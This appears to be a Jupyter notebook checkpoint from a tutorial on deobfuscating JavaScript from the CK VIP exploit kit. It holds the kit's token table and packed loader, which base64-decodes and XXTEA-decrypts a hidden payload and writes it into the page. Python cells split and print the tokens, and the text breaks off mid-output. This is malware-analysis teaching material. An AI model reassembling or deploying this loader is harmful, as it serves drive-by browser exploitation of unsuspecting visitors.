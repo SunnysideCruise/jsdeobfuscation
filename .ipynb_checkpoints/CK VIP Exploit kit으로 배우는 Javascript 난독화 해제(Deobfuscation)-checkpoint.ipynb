{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CK VIP Killer Notebook"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Author Youngwook Kim\n",
    "#### Ver 2016-10-28"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CK VIP 란?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "vhz2z4='*i*v*var**out*str**len***charCodeAt**case*y*return*if*length*z*c3*p*c4*0xff*while*sum*break*s*String*c2*e*function*char2*n*c1*c*0xffffffff*mx*nbChar*ErTiUlaxlkP*w*X3cQCMIIF*AVgHbu2f*fromCharCode*t*do*char3*BMOYPRD4H*6b*str2long*for*k*delta*0x3F*vl*join*utf8to16*KeY*NtCion*key*false*itVm_snY3*sl*q*nbencode*long2str*GIEMslIELDjE*nbcode*HgAGJ6WJYFL*fYcoa*e62g5*HlG2Q0h6qH4VDaIszr*0qok8YGem8PmDiLUw1EYKPIRFxU1kZS43mmanxoE*fgve7a*1tp1ALr5sXKzYLxaH*dG9voAXeorZrnD5DajGhFD*oEAN*ATYDZH4phKQMGo2iDgqA4W24hONU2RMt3yq*7OSS3gt*GlXx3vsD0bwf3lHbLW2anQJddojjhVbr*ejzoyWiqVmI3k5ynQBm3hwOUTmms6axy65JaOJwrGt5xrWmwfpSML0BjDG0yL0kztCJTt1xA8d6DyNW9zy1ABQJcfFyYn*vWQMtSWSbIwgH4UzcN6nuRP7n4q99PZW8jteXrpgcQgdpbkHABTO*8HGJCh1idEw0Bo1W16p*xDZQ8E9rr1JGJK3KJiBmzrhKFLJJ2LI*mCha*fro*ZAahwtK2U6NgKmp13YoeoilvC0vp6wF*rCode*u7Ut0F6v38CNH5ZES0E3m63EoH6jiqQ0C34YLxEGj4fe1HJR7qfkMDH*pXOgyMMQN4mrhhFnVzRoAOqHdEOzBVP1JcGfzyapNUBLtiJYSX6rkDEngp2hxabHEffuILBKShxC1bu1OX5*DUuT1*0x03*42sQFqveZmFthRv9cRLEkx085ih8*amFXzdlWQ*0x30*oN3EVk65oyD*URpV4C1J2OgUiPds9gRcT4Mqw8cJJ9LTWOuaw9xXC5mwBWVcpg0sTiGre6rgp8xCMkX1YKT8oHjab2AZEMDCiLgEh7nnUSgiiV1T74oxS1yk8q27WkM9HuSnXqE9MQgJaMOgu*l96SCzj854x2RKmOvxs*0XF*MyyiqZ3ee5TbHN2GYG*0x3C*XntEaVVyQ27nj9E9R3y3nf0*NS6V*Array*vYJzslNjO6Q2S90TOo3JLhsIdr8o8FzBxgYbwwFLnmD5TGMOVEOeLiuTVOr8ZaSi*new*xBVxhwEX6C9bAWV1OP0wlQv5u4MnvT4iGviRs7C4FHPOcBb3pThPQCFDHnB6N5816ae7uIomfAYpCQzFG3EifoJsWn79A4si*0x0F*mW*dxFOn8Q6376zO1qm1P5bEH9C4G1*CMfBZkeNIl4oQka8g*YwYzTYchmXxY7*axTs0jn4qynjKptUQA28sJm*Pa0dlGfkquC*pKo8UF3jCi5fzTrEnDDLvMByVL7g*de*6iJLK2aWHg9JPUx0Eum1ni*switch*fNmmjSrTgJixN5WBZwyzKQDCvxAAPtBRUlekSb*VpZLp4BQ4hilnf9LgHTRzeuedKUntBj6tQOoDT4Ckt*Ej0AwthrOZX2r8WsU4KV4dXYn86bb0kGBJAU4pr4kGas8dD71qW94OLX*charAt*0x1F*harCo*omC*fr*bPtzChOQUHK4raiXfw1kAS01hvc6mXUR59d9792VVQKhjgKgA1fh24TTS82HwlQU2fm6eqYtzE6hvrdRfaSLRIDsFRIifn9gfkRUoVqDG0WRXTKr*elAU9xX7rVuSOkz28mCGZylP*VYFYmjafyrmdCYPbyNXiGoiE9AjsNMZ0xjS*m8gdyaOXgSv0QTIS6Z3T6ZC14*mri0hTbS4RbK4Moo18LyZjQHSgZj*7kpwrNKACTYryrtGh3usPHhiFDs8GGEFJDit2Eyk6ZZNODzTxzXhT6yOLuM06uY*UHs8pJ3fp1TRSUNWam*L1UO*qe40e0h3mKHqimOewpSVdGzQb4vxNMfh4gj0IWEvkNc1wzcQMDq6UEi*pOKgpmbCSJIFpzVHlcB9LQae7SKNl6y51j7CSURxLrurhaDCwQjN0FTWVd85TmX7wmR6M1ynZ8zqJpIEa5daTeOKqYdNKAqaEwdHQI2HFrW5eRqQmEktl72YZhdLMgXbY*Whw0VLgIjGuJH7CcSUre*0978HzQaMXXz24WBWm1QbyiYGVGCoCLU3nbBjJ6*RslR2csadulegltGOKgc3I9SDHt4kWdn65cft*L*r4VoMb*lpAu7f3ml9n1QAJlTInnzzynohGLlVnRURDHp0gbyISumaTAuJvLviW4R40boA*QbqVoKOyjolYj9vHKOGhLZq9n7lDMKvb4eZ61QQbsGXciI1eM6CKrbq8VT6eMHecnqJASAk0I2d4NXSqLmVB2qch1rTDslN25KH3nHZqrpc4uJ7v5XBqJ1dYKvFilTuCjCsSOuDoFVHNxq52P*ufSAZ9s0DCG91NKkPSIih7Yny*fxvsOrkrOBTu4ekO3sOwaHqILAonzSt0whMC0e*gZ*YK1qy1X*U5a9*WOkEKWr5AqY8rlPmppLzySTD8duxe1MdxB7eq*Mwtrb*56io9PcHvHsBlE5kuKeN4gcYr0gEFmxCTmzysfYnGsRmk4useGZtT0UGwtkHWGdfVPzumQ*PkwHurzm74ZKrN3M4CJdiL1ORQKSPtsD9s0LeYmx4dr1zaalo6ElNx3E2x8rD7*Vc5RIc5Zpwan4RBM2mTVsgiVdJOyqwHug9QucLLcRRp5mDTGJiz0UALKtfDabnee2J5qQzWvr2yRyTfyQebMtCCr*3fjg6YwKqpgOB8iHDU3UBPzKk8yEtb0Gmx*window*3goD*9N*4J9tUQi99zY4Bjmc1SyADJiqeDNkY7b8uw7XL4kwrpwy4GVDsMh8m6P1wPp*7kxPX506IoEGeoQ2swFj*bzvyk*39XgaLNhwLo9ErYLLi7fnP82Ux*zng3hPhYID*AYYJV2Ud1dvs7DYy0No*RigwWVLYW*BSX4ZQZoW6x0JH3RIbEH9ME1tABADI2DmaO87lIlQGSQ57d1KpJ7sJ8rQ8AeXyaAaTtW2nVefxcirTmnYoxiACYxk8F4pBDOCvm3mDkm5ApqQvmKTuwMrFu9*Tq1bIKvOmdKRqbNpdb5cGc3d*R2aUXN899lY*v4OkEe2ZxGcvth257PwVQb0ub5SgV5puFW4gde5w6clapbI2AAykDr7QUrPgpGH1PYlozHJPURX61ROk2gHLC01k3I9d6pjtn*IEZe8uY2TqqwEu5jykd3J55XXaJ42d*7YK81INsk6Uz8l*0vsNw5FqmQEAYuplFrt98a2yCWVTs5yrpYKiWDO9uxVOLjcBLsyFQJgGhD9gRWav3SuqfMyW3dvM3BZActgas4Xo5oz624ZWKPw4VoTjtoJSnlEyrfye8r*lH9qOZis6wzk8Y8QctBLsIx69FHY7B*11UG*RS4ADhxypxfdvlfCrKRC4ISQSpRbU4BWkZzFoIFTN3haSKVGiagHKJ2mT9Tqf8X0xDWH6lYahWKW9dW31h0z7x2yHx7n56QR3w8gRuDuId*5d5eN0VqfrPFvyGkFV5JrU88oxT1pUXG8CBtFQxgicMh3P6bNaELkOO*GeJQAMbK6K77TumvrlEFonf0Ovi2iniFbh08m3cQAORcARLQNepCElHUY4P8VhdYCjNvFNHaPBm5HXmma*KJb6Nqq8BoBvStBLoTM9TzGhnOLku3jWkOlk53wUW4Z0H6EplheWJLUeQX7cG9oG*nmQnIZzlUhV0Wyaey2CcYzui1JHsBTCTJarjN9z3nwybtCm6M0KT1eK1NSi0PB5FbMvSJK*4QBMjo6UHuEH3T88jkp3bnRxrxsxNQ7uWrmy57UrSgJLFUH3lwBXDoGbtK0VmGvI4iiTl6e4b*s6l0Z8jQJ3XXImIWJyu*hJJh8F2*cgXfUFuX*HckMdGiuKNssm5kbzjtQsQEh*vNuqLcoYTrSTt8RSmaaaUrrN9oh9dTfmFDntxyvb1zVMBGcRIgAWH*HEMkeq00gxjBRkgWVVRg5BYieaXlNO7NSuRtEBQPXuGS77HbBL7RN1smIvvstap0z2XB41ZUwvmIEbA8spyRUenDvfHpIR9iZwABF5RycqD1L*2YKxCgTszXTQMG2oJwN3apfWcUpELQerhfLfGdeIIgB0IFr9CyK7f*akDF7LEZES6W8VDwuXk*cm*m1k7Jn3t91i2bkIHOOdcRsiLlE8DhbE50QNUydQZiHl9F8G5DDgioIZnWwJ*0lvtF4acl*NanzUKOF5FgAUfEjCvARRNUDM5enzjpU*zOJcI71AVXyOoj5rFb4rG6RCPZ2mKMBndrtJNDwjEylqCWGflKjK4MF*x5EhVdw5SGIfKJJ5LzQa6MQnvkVXW4RWFPYX6S4L7qHN1cAdqyP7pXB*oAsrqxNA3ebBW4xx81xdOJaKvG6OW*c9arTYmROBS4vzYMzHdMAj0bfDFi4GCR5cyseIiMUcr7rcsxDteAsz9s4qrbMLpvLvOn3zIGcFphhJxG90dObQ7z0pOUvPepQ77AM5YgyeKtHvzoJb*eQqB*7A87pQ*AHr6iDjpx1z*INsC5yTHcbqgdJrnB2CZ1cr9cLkvS8IbNys*AHcHxkhsJ25nzRdVqncUVuMTfXD1Da7XK0CE*z9PfA6SKi1KZ8sMCgYPcX7Llw*6f*floor*Math*DXeQ8Ih00L*cap*u*nes*OiJWnvyvFI4AXlD01xbhjmjIRg*0x9E3779B9*MJvwFbd9kybNV6kaSOLSwkReClcCszUaCXIR1WlqdWdrH*6e*else*substring*4Wf5AE0685fcTNz3asrk0agsEeRfJs5bGkTGtO*6d*S4UVbzmZkoWK47LPfS3uyUuVEqqneI*PBI5u4uTRy*HK7SlQJ1XFyJf1lUCdzMCg7MUduRoSp2fVRgfHNaJ32UOnFfl9wj7ulzOunE4LeReuCOONVQCdpaPl0jX2LM1iJTJEqyYtPCFRgS0R8l84ZLYnCC1Q6Jur*nbVZ1ZS3o4vpMZv3AoXhga2Xlo4jjDUTf*zV3YTRnmEORpJKjStNiO1z1E0FEGyLuAxFhZ7Nues1ggxglPcwCFeDO*qTmtx8O4Seda4030oiqSTS6is7sI*DapdSDguBoHvg9*4Gv1HWXHlKcXFpbcYX83wLm8j9b07ADGPUD4ZNGjTwrnWxNhcbaDpOfugoEtoulQbKmquLikWS8ZgAKkOIzY*qARPnOweHAUqWgazndLTM0gS7ATt3I2oVSo7pkXj0XKjMTvJDOCpg*FgyKA8mgKvqN5hTNrOXx*UlGk0*RKTmRqmPe7Duq0BZbluMqlksoaE2vD6bKFJbCe4iRQ6GwTeWVZzC9o7lzxw3g*WrC90B2350tY5UiuZDOcu3YpFeDDyLQ0AM6Xrx7YIzzzeNKzpjs3Xy6Uy9eBfnmIzdRrocXduhAa3Gw4LMsAfU*FAD2*DjkJa8Tls3*LuR5uQzyZb4ZlDpSK66wVli90C5VjWZaeYhdejefUdXsNpgo0ZLRvi1Jy4N9J*oWla84oDmdoetK4APv2JHRc0vTqk*HWFShDHe44QG3xMzqtkDjPF7L4Ix7*M7JgrZspyS4kc*zeR9GNyNmEfbyK*eval*86eHPf9YN3*true*yOgaV7gTJK73IoMxaEc6pn0s*hTlgLLZXGfcq6rIDtfICRvU4DJjvV15qrPAO*HJ6cBt2R0Jw9DYR1KzZYY2A7WbP4tF4fwRmzBDRVLcH2lhN8OavWS'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "a=vhz2z4.split('*')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['', '', 'i', 'v', 'var', '', 'out', 'str', '', 'len']"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['HJ6cBt2R0Jw9DYR1KzZYY2A7WbP4tF4fwRmzBDRVLcH2lhN8OavWS',\n",
       " 'hTlgLLZXGfcq6rIDtfICRvU4DJjvV15qrPAO',\n",
       " 'yOgaV7gTJK73IoMxaEc6pn0s',\n",
       " 'true',\n",
       " '86eHPf9YN3',\n",
       " 'eval',\n",
       " 'zeR9GNyNmEfbyK',\n",
       " 'M7JgrZspyS4kc',\n",
       " 'HWFShDHe44QG3xMzqtkDjPF7L4Ix7',\n",
       " 'oWla84oDmdoetK4APv2JHRc0vTqk']"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a.reverse()\n",
    "a[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "cipher = '''68 125=300,106=125(\\'270\\'+\\'271\\'+\\'269\\'+\\'94\\'),130=\\'%31\\'+\\'%32\\'+\\'%33\\'+\\'%34\\'+\\'%35\\'+\\'%36\\'+\\'%37\\'+\\'%38\\',105=\\'%64\\'+\\'%265\\'+\\'%63\\'+\\'%75\\'+\\'%279\\'+\\'%65\\'+\\'%275%74\\',121=\\'157/161+160+165/144/132/+137+134+136/139+140/143+145/135/138/141/142/133+163+217+200+166+202+203+199+198/194/193+195/196/197+204+205+213+214+215+216+212+211/207/206+208/209/210+192+191/174+175+176/177/173/172/168/180++182+183+184+283\\',103=\\'%77\\'+\\'%72%69%74\\'+\\'%65\\',111;95 120(71){68 70,66,73,99;68 96,110;70=[];73=71.82;66=0;88(66<73){99=71.76(66++);181(99>>4){78 0:78 1:78 2:78 3:78 4:78 5:78 6:78 7:70[70.82]=71.185(66-1);90;78 12:78 13:96=71.76(66++);70[70.82]=92[\\'107\\'](((99&186)<<6)|(96&117));90;78 14:96=71.76(66++);110=71.76(66++);70[70.82]=92[\\'189\\'+\\'188\\'+\\'187\\'+\\'179\\'](((99&171)<<12)|((96&117)<<6)|((110&117)<<0));90}}80 70.119(\\'\\')}68 122=\\'%39\\'+\\'%63\\'+\\'%112\\'+\\'%63\\'+\\'%112\\'+\\'%63\\'+\\'%112\\';68 102=169 167(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30\n",
    "123\n",
    ",31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);105=106(105);95 131(71){68 98,93,84,86;68 66,73,70;73=71.82;66=0;70=\"\";88(66<73){109{98=102[71.76(66++)&87]}88(66<73&&98==-1);81(98==-1)90;109{93=102[71.76(66++)&87]}88(66<73&&93==-1);81(93==-1)90;70+=92.107((98\n",
    "780\n",
    "<<2)|((93&158)>>4));109{84=71.76(66++)&87;81(84==61)80 70;84=102[84]}88(66<73&&84==-1);81(84==-1)90;70+=92.107(((93&162)<<4)|((84&164)>>2));109{86=71.76(66++)&87;81(86==61)80 70;86=102[86]}88(66<73&&86==-1);81(86==-1)90;70+=92[\\'149\\'+\\'148\\'+\\'151\\'](((84&155)<<6)|86)}80 70}95 129(67,104){68 118=67.82;68 126=67[118-1]&100;114(68 66=0;66<118;66++){67[66]=92.107(67[66]&87,67[66]>>>8&87,67[66]>>>16&87,67[66]>>>24&87)}81(104){80 67.119(\\'\\').277(0,126)}276{80 67.119(\\'\\')}}95 113(91,104){68 73=91.82;68 67=[];114(68 66=0;66<73;66+=4){67[66>>2]=91.76(66)|91.76(66+1)<<8|91.76(66+2)<<16|91.76(66+3)<<24}81(104){67[67.82]=73}80 67}111=106(130+122);95 128(71,123){81(71==\"\"){80\"\"}68 67=113(71,124);68 115=113(123,124);68 97=67.82-1;68 83=67[97-1],79=67[0],116=273;68 101,94,127=267.266(6+52/(97+1)),89=127*116&100;88(89!=0){94=89>>>2&3;114(68 85=97;85>0;85--){83=67[85-1];101=(83>>>5^79<<2)+(79>>>3^83<<4)^(89^79)+(115[85&3^94]^83);79=67[85]=67[85]-101&100}83=67[97];101=(83>>>5^79<<2)+(79>>>3^83<<4)^(89^79)+(115[85&3^94]^83);79=67[0]=67[0]-101&100;89=89-116&100}80 129(67,302)}103=106(103);108=\\'295/289+288+287+286+290+291+294+293/292+263/262+234/233+232+231+235/236+239+238+237+230/229+222/221+220+219/223/224/228+227/226+225+240+241/256/255+254/253+257+258/261+260+259/252+251+245+244/+\\'+121+\\'+243/242+246+247+250/249/248/146/296+297+298+299/3+285+272/264/281/282+280+278+284+201+153+154/152+150/156+0/159/170+178+190/147+303+301/305/304/268+274\\';108=120(128(131(108),111));218[105][103](108)'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "i\n",
      "v\n",
      "var\n",
      "out\n",
      "str\n",
      "len\n",
      "charCodeAt\n",
      "case\n",
      "y\n",
      "return\n",
      "if\n",
      "length\n",
      "z\n",
      "c3\n",
      "p\n",
      "c4\n",
      "0xff\n",
      "while\n",
      "sum\n",
      "break\n",
      "s\n",
      "String\n",
      "c2\n",
      "e\n",
      "function\n",
      "char2\n",
      "n\n",
      "c1\n",
      "c\n",
      "0xffffffff\n",
      "mx\n",
      "nbChar\n",
      "ErTiUlaxlkP\n",
      "w\n",
      "X3cQCMIIF\n",
      "AVgHbu2f\n",
      "fromCharCode\n",
      "t\n",
      "do\n",
      "char3\n",
      "BMOYPRD4H\n",
      "6b\n",
      "str2long\n",
      "for\n",
      "k\n",
      "delta\n",
      "0x3F\n",
      "vl\n",
      "join\n",
      "utf8to16\n",
      "KeY\n",
      "NtCion\n",
      "key\n",
      "false\n",
      "itVm_snY3\n",
      "sl\n",
      "q\n",
      "nbencode\n",
      "long2str\n",
      "GIEMslIELDjE\n",
      "nbcode\n",
      "HgAGJ6WJYFL\n",
      "fYcoa\n",
      "e62g5\n",
      "HlG2Q0h6qH4VDaIszr\n",
      "0qok8YGem8PmDiLUw1EYKPIRFxU1kZS43mmanxoE\n",
      "fgve7a\n",
      "1tp1ALr5sXKzYLxaH\n",
      "dG9voAXeorZrnD5DajGhFD\n",
      "oEAN\n",
      "ATYDZH4phKQMGo2iDgqA4W24hONU2RMt3yq\n",
      "7OSS3gt\n",
      "GlXx3vsD0bwf3lHbLW2anQJddojjhVbr\n",
      "ejzoyWiqVmI3k5ynQBm3hwOUTmms6axy65JaOJwrGt5xrWmwfpSML0BjDG0yL0kztCJTt1xA8d6DyNW9zy1ABQJcfFyYn\n",
      "vWQMtSWSbIwgH4UzcN6nuRP7n4q99PZW8jteXrpgcQgdpbkHABTO\n",
      "8HGJCh1idEw0Bo1W16p\n",
      "xDZQ8E9rr1JGJK3KJiBmzrhKFLJJ2LI\n",
      "mCha\n",
      "fro\n",
      "ZAahwtK2U6NgKmp13YoeoilvC0vp6wF\n",
      "rCode\n",
      "u7Ut0F6v38CNH5ZES0E3m63EoH6jiqQ0C34YLxEGj4fe1HJR7qfkMDH\n",
      "pXOgyMMQN4mrhhFnVzRoAOqHdEOzBVP1JcGfzyapNUBLtiJYSX6rkDEngp2hxabHEffuILBKShxC1bu1OX5\n",
      "DUuT1\n",
      "0x03\n",
      "42sQFqveZmFthRv9cRLEkx085ih8\n",
      "amFXzdlWQ\n",
      "0x30\n",
      "oN3EVk65oyD\n",
      "URpV4C1J2OgUiPds9gRcT4Mqw8cJJ9LTWOuaw9xXC5mwBWVcpg0sTiGre6rgp8xCMkX1YKT8oHjab2AZEMDCiLgEh7nnUSgiiV1T74oxS1yk8q27WkM9HuSnXqE9MQgJaMOgu\n",
      "l96SCzj854x2RKmOvxs\n",
      "0XF\n",
      "MyyiqZ3ee5TbHN2GYG\n",
      "0x3C\n",
      "XntEaVVyQ27nj9E9R3y3nf0\n",
      "NS6V\n",
      "Array\n",
      "vYJzslNjO6Q2S90TOo3JLhsIdr8o8FzBxgYbwwFLnmD5TGMOVEOeLiuTVOr8ZaSi\n",
      "new\n",
      "xBVxhwEX6C9bAWV1OP0wlQv5u4MnvT4iGviRs7C4FHPOcBb3pThPQCFDHnB6N5816ae7uIomfAYpCQzFG3EifoJsWn79A4si\n",
      "0x0F\n",
      "mW\n",
      "dxFOn8Q6376zO1qm1P5bEH9C4G1\n",
      "CMfBZkeNIl4oQka8g\n",
      "YwYzTYchmXxY7\n",
      "axTs0jn4qynjKptUQA28sJm\n",
      "Pa0dlGfkquC\n",
      "pKo8UF3jCi5fzTrEnDDLvMByVL7g\n",
      "de\n",
      "6iJLK2aWHg9JPUx0Eum1ni\n",
      "switch\n",
      "fNmmjSrTgJixN5WBZwyzKQDCvxAAPtBRUlekSb\n",
      "VpZLp4BQ4hilnf9LgHTRzeuedKUntBj6tQOoDT4Ckt\n",
      "Ej0AwthrOZX2r8WsU4KV4dXYn86bb0kGBJAU4pr4kGas8dD71qW94OLX\n",
      "charAt\n",
      "0x1F\n",
      "harCo\n",
      "omC\n",
      "fr\n",
      "bPtzChOQUHK4raiXfw1kAS01hvc6mXUR59d9792VVQKhjgKgA1fh24TTS82HwlQU2fm6eqYtzE6hvrdRfaSLRIDsFRIifn9gfkRUoVqDG0WRXTKr\n",
      "elAU9xX7rVuSOkz28mCGZylP\n",
      "VYFYmjafyrmdCYPbyNXiGoiE9AjsNMZ0xjS\n",
      "m8gdyaOXgSv0QTIS6Z3T6ZC14\n",
      "mri0hTbS4RbK4Moo18LyZjQHSgZj\n",
      "7kpwrNKACTYryrtGh3usPHhiFDs8GGEFJDit2Eyk6ZZNODzTxzXhT6yOLuM06uY\n",
      "UHs8pJ3fp1TRSUNWam\n",
      "L1UO\n",
      "qe40e0h3mKHqimOewpSVdGzQb4vxNMfh4gj0IWEvkNc1wzcQMDq6UEi\n",
      "pOKgpmbCSJIFpzVHlcB9LQae7SKNl6y51j7CSURxLrurhaDCwQjN0FTWVd85TmX7wmR6M1ynZ8zqJpIEa5daTeOKqYdNKAqaEwdHQI2HFrW5eRqQmEktl72YZhdLMgXbY\n",
      "Whw0VLgIjGuJH7CcSUre\n",
      "0978HzQaMXXz24WBWm1QbyiYGVGCoCLU3nbBjJ6\n",
      "RslR2csadulegltGOKgc3I9SDHt4kWdn65cft\n",
      "L\n",
      "r4VoMb\n",
      "lpAu7f3ml9n1QAJlTInnzzynohGLlVnRURDHp0gbyISumaTAuJvLviW4R40boA\n",
      "QbqVoKOyjolYj9vHKOGhLZq9n7lDMKvb4eZ61QQbsGXciI1eM6CKrbq8VT6eMHecnqJASAk0I2d4NXSqLmVB2qch1rTDslN25KH3nHZqrpc4uJ7v5XBqJ1dYKvFilTuCjCsSOuDoFVHNxq52P\n",
      "ufSAZ9s0DCG91NKkPSIih7Yny\n",
      "fxvsOrkrOBTu4ekO3sOwaHqILAonzSt0whMC0e\n",
      "gZ\n",
      "YK1qy1X\n",
      "U5a9\n",
      "WOkEKWr5AqY8rlPmppLzySTD8duxe1MdxB7eq\n",
      "Mwtrb\n",
      "56io9PcHvHsBlE5kuKeN4gcYr0gEFmxCTmzysfYnGsRmk4useGZtT0UGwtkHWGdfVPzumQ\n",
      "PkwHurzm74ZKrN3M4CJdiL1ORQKSPtsD9s0LeYmx4dr1zaalo6ElNx3E2x8rD7\n",
      "Vc5RIc5Zpwan4RBM2mTVsgiVdJOyqwHug9QucLLcRRp5mDTGJiz0UALKtfDabnee2J5qQzWvr2yRyTfyQebMtCCr\n",
      "3fjg6YwKqpgOB8iHDU3UBPzKk8yEtb0Gmx\n",
      "window\n",
      "3goD\n",
      "9N\n",
      "4J9tUQi99zY4Bjmc1SyADJiqeDNkY7b8uw7XL4kwrpwy4GVDsMh8m6P1wPp\n",
      "7kxPX506IoEGeoQ2swFj\n",
      "bzvyk\n",
      "39XgaLNhwLo9ErYLLi7fnP82Ux\n",
      "zng3hPhYID\n",
      "AYYJV2Ud1dvs7DYy0No\n",
      "RigwWVLYW\n",
      "BSX4ZQZoW6x0JH3RIbEH9ME1tABADI2DmaO87lIlQGSQ57d1KpJ7sJ8rQ8AeXyaAaTtW2nVefxcirTmnYoxiACYxk8F4pBDOCvm3mDkm5ApqQvmKTuwMrFu9\n",
      "Tq1bIKvOmdKRqbNpdb5cGc3d\n",
      "R2aUXN899lY\n",
      "v4OkEe2ZxGcvth257PwVQb0ub5SgV5puFW4gde5w6clapbI2AAykDr7QUrPgpGH1PYlozHJPURX61ROk2gHLC01k3I9d6pjtn\n",
      "IEZe8uY2TqqwEu5jykd3J55XXaJ42d\n",
      "7YK81INsk6Uz8l\n",
      "0vsNw5FqmQEAYuplFrt98a2yCWVTs5yrpYKiWDO9uxVOLjcBLsyFQJgGhD9gRWav3SuqfMyW3dvM3BZActgas4Xo5oz624ZWKPw4VoTjtoJSnlEyrfye8r\n",
      "lH9qOZis6wzk8Y8QctBLsIx69FHY7B\n",
      "11UG\n",
      "RS4ADhxypxfdvlfCrKRC4ISQSpRbU4BWkZzFoIFTN3haSKVGiagHKJ2mT9Tqf8X0xDWH6lYahWKW9dW31h0z7x2yHx7n56QR3w8gRuDuId\n",
      "5d5eN0VqfrPFvyGkFV5JrU88oxT1pUXG8CBtFQxgicMh3P6bNaELkOO\n",
      "GeJQAMbK6K77TumvrlEFonf0Ovi2iniFbh08m3cQAORcARLQNepCElHUY4P8VhdYCjNvFNHaPBm5HXmma\n",
      "KJb6Nqq8BoBvStBLoTM9TzGhnOLku3jWkOlk53wUW4Z0H6EplheWJLUeQX7cG9oG\n",
      "nmQnIZzlUhV0Wyaey2CcYzui1JHsBTCTJarjN9z3nwybtCm6M0KT1eK1NSi0PB5FbMvSJK\n",
      "4QBMjo6UHuEH3T88jkp3bnRxrxsxNQ7uWrmy57UrSgJLFUH3lwBXDoGbtK0VmGvI4iiTl6e4b\n",
      "s6l0Z8jQJ3XXImIWJyu\n",
      "hJJh8F2\n",
      "cgXfUFuX\n",
      "HckMdGiuKNssm5kbzjtQsQEh\n",
      "vNuqLcoYTrSTt8RSmaaaUrrN9oh9dTfmFDntxyvb1zVMBGcRIgAWH\n",
      "HEMkeq00gxjBRkgWVVRg5BYieaXlNO7NSuRtEBQPXuGS77HbBL7RN1smIvvstap0z2XB41ZUwvmIEbA8spyRUenDvfHpIR9iZwABF5RycqD1L\n",
      "2YKxCgTszXTQMG2oJwN3apfWcUpELQerhfLfGdeIIgB0IFr9CyK7f\n",
      "akDF7LEZES6W8VDwuXk\n",
      "cm\n",
      "m1k7Jn3t91i2bkIHOOdcRsiLlE8DhbE50QNUydQZiHl9F8G5DDgioIZnWwJ\n",
      "0lvtF4acl\n",
      "NanzUKOF5FgAUfEjCvARRNUDM5enzjpU\n",
      "zOJcI71AVXyOoj5rFb4rG6RCPZ2mKMBndrtJNDwjEylqCWGflKjK4MF\n",
      "x5EhVdw5SGIfKJJ5LzQa6MQnvkVXW4RWFPYX6S4L7qHN1cAdqyP7pXB\n",
      "oAsrqxNA3ebBW4xx81xdOJaKvG6OW\n",
      "c9arTYmROBS4vzYMzHdMAj0bfDFi4GCR5cyseIiMUcr7rcsxDteAsz9s4qrbMLpvLvOn3zIGcFphhJxG90dObQ7z0pOUvPepQ77AM5YgyeKtHvzoJb\n",
      "eQqB\n",
      "7A87pQ\n",
      "AHr6iDjpx1z\n",
      "INsC5yTHcbqgdJrnB2CZ1cr9cLkvS8IbNys\n",
      "AHcHxkhsJ25nzRdVqncUVuMTfXD1Da7XK0CE\n",
      "z9PfA6SKi1KZ8sMCgYPcX7Llw\n",
      "6f\n",
      "floor\n",
      "Math\n",
      "DXeQ8Ih00L\n",
      "cap\n",
      "u\n",
      "nes\n",
      "OiJWnvyvFI4AXlD01xbhjmjIRg\n",
      "0x9E3779B9\n",
      "MJvwFbd9kybNV6kaSOLSwkReClcCszUaCXIR1WlqdWdrH\n",
      "6e\n",
      "else\n",
      "substring\n",
      "4Wf5AE0685fcTNz3asrk0agsEeRfJs5bGkTGtO\n",
      "6d\n",
      "S4UVbzmZkoWK47LPfS3uyUuVEqqneI\n",
      "PBI5u4uTRy\n",
      "HK7SlQJ1XFyJf1lUCdzMCg7MUduRoSp2fVRgfHNaJ32UOnFfl9wj7ulzOunE4LeReuCOONVQCdpaPl0jX2LM1iJTJEqyYtPCFRgS0R8l84ZLYnCC1Q6Jur\n",
      "nbVZ1ZS3o4vpMZv3AoXhga2Xlo4jjDUTf\n",
